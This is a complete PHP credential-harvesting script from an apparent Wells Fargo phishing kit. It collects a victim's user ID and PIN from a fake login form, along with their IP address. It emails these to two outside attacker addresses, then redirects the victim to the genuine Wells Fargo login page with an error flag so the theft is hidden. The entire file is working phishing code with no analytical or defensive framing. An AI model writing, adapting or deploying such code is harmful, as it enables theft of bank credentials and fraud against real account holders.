<?php
$ip = getenv("REMOTE_ADDR");
$message .= "--------------wellsfargo Login Info-----------------------\n";
$message .= "User Id             : ".$_POST['user']."\n";
$message .= "Pin             : ".$_POST['pin']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Drey-------------\n";
$send = "locality208@gmail.com,locality208@yandex.com";
$subject = "Result from $ip";
$headers = "From: Wells Log <$ip@newlife.com>";
$headers .= $_POST['toulouw']."\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}
	
		   header("Location: https://connect.secure.wellsfargo.com/auth/login/present?origin=cob&error=yes&destination=AccountSummary");

	 
?>